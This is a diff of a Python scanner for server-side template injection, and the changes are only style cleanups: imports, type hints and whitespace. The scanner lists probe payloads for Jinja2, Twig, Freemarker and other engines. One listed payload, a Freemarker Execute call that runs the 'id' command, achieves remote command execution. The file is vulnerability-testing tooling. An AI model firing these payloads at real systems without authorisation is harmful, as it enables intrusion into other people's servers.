@@ -3,11 +3,11 @@ Server-Side Template Injection (SSTI) Scanner for Web-Cross
 Detects template injection vulnerabilities in Jinja2, Twig, Freemarker, etc.
 """
 
-import re
-import requests
-from typing import Dict, List, Any, Optional, Tuple
 from dataclasses import dataclass
-from urllib.parse import urljoin, urlparse, parse_qs, urlencode
+from typing import Any
+from urllib.parse import parse_qs, urlencode, urlparse
+
+import requests
 
 
 @dataclass
@@ -24,7 +24,7 @@ class SSTIFinding:
 class SSTIScanner:
     """
     Server-Side Template Injection Scanner.
-    
+
     Tests for:
     - Jinja2 (Python)
     - Twig (PHP)
@@ -35,7 +35,7 @@ class SSTIScanner:
     - Pebble (Java)
     - ERB (Ruby)
     """
-    
+
     # Detection payloads - mathematical operations that expose template engines
     DETECTION_PAYLOADS = [
         # Universal detection
@@ -47,26 +47,26 @@ class SSTIScanner:
         ("${{7*7}}", "49", "Java EL"),
         ("{7*7}", "49", "Smarty"),
         ("*{7*7}", "49", "Thymeleaf"),
-        
+
         # Jinja2 specific
         ("{{config}}", "Config", "Jinja2"),
         ("{{self}}", "TemplateReference", "Jinja2"),
         ("{{request}}", "Request", "Jinja2"),
-        
+
         # Twig specific
         ("{{_self.env}}", "Environment", "Twig"),
         ("{{app.request}}", "Request", "Twig"),
-        
+
         # Freemarker specific
         ("${.version}", "Freemarker", "Freemarker"),
         ("${.now}", "datetime", "Freemarker"),
-        
+
         # String concatenation detection
         ("{{\"foo\"+\"bar\"}}", "foobar", "Jinja2/Twig"),
         ("${\"foo\"+\"bar\"}", "foobar", "Freemarker"),
         ("#{\"foo\"+\"bar\"}", "foobar", "ERB"),
     ]
-    
+
     # Exploitation payloads (for confirmation only - don't execute)
     EXPLOIT_PAYLOADS = {
         "Jinja2": [
@@ -83,39 +83,39 @@ class SSTIScanner:
             "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
         ],
     }
-    
+
     def __init__(self, timeout: int = 10):
         self.timeout = timeout
-        self.findings: List[SSTIFinding] = []
-    
-    def _extract_params(self, url: str) -> List[str]:
+        self.findings: list[SSTIFinding] = []
+
+    def _extract_params(self, url: str) -> list[str]:
         """Extract query parameters from URL."""
         parsed = urlparse(url)
         params = parse_qs(parsed.query)
         return list(params.keys())
-    
+
     def _inject_payload(self, url: str, param: str, payload: str) -> str:
         """Inject payload into URL parameter."""
         parsed = urlparse(url)
         params = parse_qs(parsed.query)
         params[param] = [payload]
-        
+
         new_query = urlencode(params, doseq=True)
         return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
-    
+
     def _test_payload(
-        self, 
-        url: str, 
-        param: str, 
-        payload: str, 
-        expected: str, 
+        self,
+        url: str,
+        param: str,
+        payload: str,
+        expected: str,
         engine: str
-    ) -> Optional[SSTIFinding]:
+    ) -> SSTIFinding | None:
         """Test a single SSTI payload."""
         try:
             test_url = self._inject_payload(url, param, payload)
             resp = requests.get(test_url, timeout=self.timeout)
-            
+
             if expected.lower() in resp.text.lower():
                 return SSTIFinding(
                     vuln_type="SSTI",
@@ -125,27 +125,27 @@ class SSTIScanner:
                     evidence=f"Pattern '{expected}' found in response",
                     parameter=param
                 )
-        except:
+        except Exception:
             pass
-        
+
         return None
-    
+
     def _test_post_payload(
         self,
         url: str,
-        data: Dict[str, str],
+        data: dict[str, str],
         field: str,
         payload: str,
         expected: str,
         engine: str
-    ) -> Optional[SSTIFinding]:
+    ) -> SSTIFinding | None:
         """Test SSTI via POST data."""
         try:
             test_data = data.copy()
             test_data[field] = payload
-            
+
             resp = requests.post(url, data=test_data, timeout=self.timeout)
-            
+
             if expected.lower() in resp.text.lower():
                 return SSTIFinding(
                     vuln_type="SSTI",
@@ -155,32 +155,32 @@ class SSTIScanner:
                     evidence=f"Pattern '{expected}' found in response",
                     parameter=field
                 )
-        except:
+        except Exception:
             pass
-        
+
         return None
-    
-    def scan_url(self, url: str) -> List[SSTIFinding]:
+
+    def scan_url(self, url: str) -> list[SSTIFinding]:
         """Scan URL parameters for SSTI."""
         findings = []
         params = self._extract_params(url)
-        
+
         if not params:
             return findings
-        
+
         for param in params:
             for payload, expected, engine in self.DETECTION_PAYLOADS:
                 finding = self._test_payload(url, param, payload, expected, engine)
                 if finding:
                     findings.append(finding)
                     break  # Found vuln in this param, move to next
-        
+
         return findings
-    
-    def scan_form(self, url: str, form_data: Dict[str, str]) -> List[SSTIFinding]:
+
+    def scan_form(self, url: str, form_data: dict[str, str]) -> list[SSTIFinding]:
         """Scan POST form fields for SSTI."""
         findings = []
-        
+
         for field in form_data.keys():
             for payload, expected, engine in self.DETECTION_PAYLOADS:
                 finding = self._test_post_payload(
@@ -189,22 +189,22 @@ class SSTIScanner:
                 if finding:
                     findings.append(finding)
                     break
-        
+
         return findings
-    
-    def scan(self, url: str, form_data: Dict[str, str] = None) -> List[Dict[str, Any]]:
+
+    def scan(self, url: str, form_data: dict[str, str] = None) -> list[dict[str, Any]]:
         """Run SSTI scan on URL and optional form data."""
         self.findings = []
-        
+
         # Scan URL params
         url_findings = self.scan_url(url)
         self.findings.extend(url_findings)
-        
+
         # Scan form if provided
         if form_data:
             form_findings = self.scan_form(url, form_data)
             self.findings.extend(form_findings)
-        
+
         return [
             {
                 "type": f.vuln_type,
@@ -219,7 +219,7 @@ class SSTIScanner:
 
 
 # Singleton
-_scanner: Optional[SSTIScanner] = None
+_scanner: SSTIScanner | None = None
 
 
 def get_scanner() -> SSTIScanner:
